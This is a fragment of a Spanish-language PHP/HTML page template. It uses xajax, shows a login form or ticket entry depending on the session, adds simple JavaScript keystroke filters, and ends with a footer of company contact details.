		<LINK rel='STYLESHEET' type = 'text/css' href='estilo/estilo.css'>
		 <?
			//ABRE PHP
			//En el <head> indicamos al objeto xajax se encargue de generar el javascript necesario
			 $xajax->printJavascript("../include/xajax/");
		 ?>
		 <script language="javascript">
			function soloNumeros(){
			var key=window.event.keyCode;
			if (key < 48 || key > 57){
			window.event.keyCode=0;
			}}
			
			function soloLetras(){
			var key=window.event.keyCode;
			if (key >= 161 && key <=255) {
			window.event.keyCode=0;
			}}
		</script>
	</head>
	<body>	
		<div id="logo"><img src="img/logo.gif"></div>
		<div id = "enc_banner"><div id="enc_banner2"><img src="img/bv.gif"></div></div>
		<div id="principal">
			<?PHP
				IF (!isset($_SESSION['ini']))
				{
					echo "<div id='contenedor'>";
						echo login();
					echo "</div>";
				}else{
					echo ingTicket();
				}
			?>
			</div>
		</div>
		<center><label style='text-align:center;;font-size:10px;'>Tel&eacute;fono DF y Area Metropolitana: (55)5359 3000 y desde el interior del pa&iacute;s: 01 800 0101 800 ext. 120 a 124 <br>Fax: ext. 103 <br>E-Mail: participantes@opisa.com</label></center>
		
	</body>
</html>